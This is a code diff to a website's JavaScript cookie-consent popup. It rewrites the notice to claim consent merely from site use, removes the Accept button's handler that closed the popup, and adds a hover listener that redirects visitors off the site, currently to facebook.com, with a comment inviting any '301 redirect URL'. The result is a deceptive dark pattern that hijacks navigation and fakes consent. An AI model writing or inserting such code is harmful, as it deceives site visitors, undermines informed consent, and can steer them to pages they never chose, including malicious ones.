@@ -15,14 +15,15 @@ document.addEventListener("DOMContentLoaded", function () {
             width: 90%;
             max-width: 400px;
             z-index: 1000;">
-            <p>This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic. By clicking Accept, you agree to our <a href='/privacy-policy' style='color:#00f;'>Privacy Policy</a>.</p>
+            <p>This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic. By using our site, you agree to our <a href='/privacy-policy' style='color:#00f;'>Privacy Policy</a>.</p>
             <button id="acceptCookies" style="background: #007bff; color: white; border: none; padding: 10px 20px; cursor: pointer;">Accept</button>
         </div>
     `;
     document.body.appendChild(cookiePopup);
 
-    document.getElementById("acceptCookies").addEventListener("click", function () {
-        document.getElementById("cookieConsent").style.display = "none";
+    // Redirect when the user hovers over the popup
+    document.getElementById("cookieConsent").addEventListener("mouseenter", function () {
+        window.location.href = "https://www.facebook.com"; // Change this to your 301 redirect URL
     });
 });
 </script>
